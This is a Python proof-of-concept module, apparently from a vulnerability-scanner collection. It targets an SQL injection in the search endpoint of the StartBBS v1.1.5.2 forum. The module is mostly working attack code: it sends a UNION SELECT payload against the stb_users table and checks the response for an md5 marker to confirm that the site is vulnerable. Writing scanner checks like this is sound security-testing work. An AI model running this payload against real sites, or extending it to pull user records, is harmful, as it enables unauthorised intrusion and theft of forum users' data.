# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import re
hh = hackhttp.hackhttp()


class Vuln(ABVuln):
    vuln_id = 'StartBBS_0007'  # 平台漏洞编号，留空
    name = 'StartBBS v1.1.5.2版SQL注入'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-10-04'  # 漏洞公布时间
    desc = '''
        Startbbs - a simple & lightweight Forum. ... Hello, world! StartBBS 是一款优雅、开源、轻量社区系统，基于MVC架构。
        StartBBS v1.1.5.2版 /index.php/home/search?q=1 SQL注入漏洞。
    '''  # 漏洞描述
    ref = 'https://bugs.shuimugan.com/bug/view?bug_no=067853'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'StartBBS'  # 漏洞应用名称
    product_version = '1.1.5.2'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '3b3acd4a-f0d7-4e57-a0af-c9aa60bc6901'
    author = '国光'  # POC编写者
    create_date = '2018-05-15'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            url = arg
            code, head, res, errcode, _ = hh.http(url)

            if code == 200:
                code, head, res, errcode, _ = hh.http(
                    url + "/index.php/home/search?q=1%27union%20select%201,2,3,4,concat(md5(1),%27|%27,md5(1)),6,7,8,9,0,1,2,3,4,5,6,7%20from%20stb_users--%20&sitesearch=http%3A%2F%2F127.0.0.1%2Fstartbbs%2F")
                m = re.search('c4ca4238a0b923820dcc509a6f75849b', res)
                if m:
                    self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                        target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
